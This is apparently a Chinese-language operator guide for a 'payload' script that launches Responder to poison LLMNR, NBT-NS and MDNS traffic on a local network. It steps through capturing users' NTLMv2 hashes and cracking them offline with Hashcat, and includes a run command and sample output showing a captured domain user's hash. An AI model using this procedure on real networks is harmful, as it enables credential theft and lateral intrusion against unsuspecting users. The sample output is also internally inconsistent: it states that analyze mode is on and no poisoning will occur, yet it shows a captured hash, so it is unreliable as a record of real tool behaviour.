## 📦 载荷使用说明：responder_start.sh

### 📝 功能说明
内网渗透必备的 LLMNR、NBT-NS 和 MDNS 毒化工具。它监听局域网内的广播请求，伪造响应，迫使受害者机器向攻击者发送 NTLMv1/v2 认证哈希。

### ⚙️ 参数说明
```text
- `-I`：监听的网卡接口（如 `eth0`）
- `-rdw`：开启相应的毒化响应功能
```

### 🚀 操作步骤
1. 确认攻击机已接入目标内网（同一二层网络）。
2. 修改脚本中的网卡接口名称。
3. 执行脚本：`bash responder_start.sh`。
4. 等待内网用户尝试访问不存在的共享或主机名，捕获其 NTLMv2 Hash。
5. 使用 Hashcat 对捕获的 Hash 进行离线破解。

### 💻 执行样例
```bash
# 在 eth0 接口启动 Responder
./responder_start.sh -I eth0 -rdw

# 预期输出：
#                                          __
#   .----.-----.-----.-----.-----.-----.--|  |.----.
#   |   _|  -__|__ --|  _  |  _  |     |  _  ||   _|
#   |__| |_____|_____|   __|_____|__|__|_____||__|
#                    |__|
# 
#            NBT-NS, LLMNR & MDNS Responder 3.1.3.0
# 
# [i] Responder is in Analyze mode. No NBT-NS, LLMNR, MDNS poisoning will occur.
# 
# [+] Listening for events...
# 
# [SMB] NTLMv2-SSP Client   : 192.168.1.20
# [SMB] NTLMv2-SSP Username : CONTOSO\user1
# [SMB] NTLMv2-SSP Hash     : user1::CONTOSO:1122334455667788:AABBCCDDEEFF00112233445566778899...
```
